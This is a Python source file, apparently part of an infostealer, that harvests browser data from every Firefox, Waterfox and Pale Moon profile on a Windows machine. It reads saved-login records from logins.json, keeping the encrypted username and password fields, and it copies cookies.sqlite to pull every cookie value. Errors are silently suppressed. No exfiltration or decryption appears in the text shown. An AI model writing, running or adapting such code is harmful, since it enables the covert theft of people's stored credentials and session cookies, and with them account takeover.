import os
import sqlite3
import json
import shutil
import tempfile
from pathlib import Path

GECKO_PATHS = {
    "Firefox": [os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles"],
    "Waterfox": [os.environ.get("APPDATA", ""), "Waterfox", "Profiles"],
    "Pale Moon": [os.environ.get("APPDATA", ""), "Moonchild Productions", "Pale Moon", "Profiles"],
}


def extract_gecko_passwords(profile_path: str) -> list[dict]:
    db_path = os.path.join(profile_path, "logins.json")
    results = []
    if not os.path.exists(db_path):
        return results
    try:
        with open(db_path) as f:
            data = json.load(f)
        for entry in data.get("logins", []):
            results.append({
                "hostname": entry.get("hostname", ""),
                "username": entry.get("encryptedUsername", ""),
                "password": entry.get("encryptedPassword", ""),
                "formSubmitURL": entry.get("formSubmitURL", ""),
            })
    except Exception:
        pass
    return results


def extract_gecko_cookies(profile_path: str) -> list[dict]:
    db_path = os.path.join(profile_path, "cookies.sqlite")
    if not os.path.exists(db_path):
        return []
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(db_path, tmp)
    results = []
    try:
        conn = sqlite3.connect(tmp)
        for row in conn.execute("SELECT host, name, path, value, expiry FROM moz_cookies"):
            results.append({"host": row[0], "name": row[1], "path": row[2], "value": row[3], "expiry": row[4]})
        conn.close()
    except Exception:
        pass
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass
    return results


def extract_gecko_all() -> dict:
    data = {"logins": [], "cookies": [], "profiles": []}
    for browser, parts in GECKO_PATHS.items():
        profiles_dir = os.path.join(*parts)
        if not os.path.exists(profiles_dir):
            continue
        for p in os.listdir(profiles_dir):
            profile_path = os.path.join(profiles_dir, p)
            if not os.path.isdir(profile_path):
                continue
            data["logins"].extend(extract_gecko_passwords(profile_path))
            data["cookies"].extend(extract_gecko_cookies(profile_path))
            data["profiles"].append({"browser": browser, "profile": p})
    return data
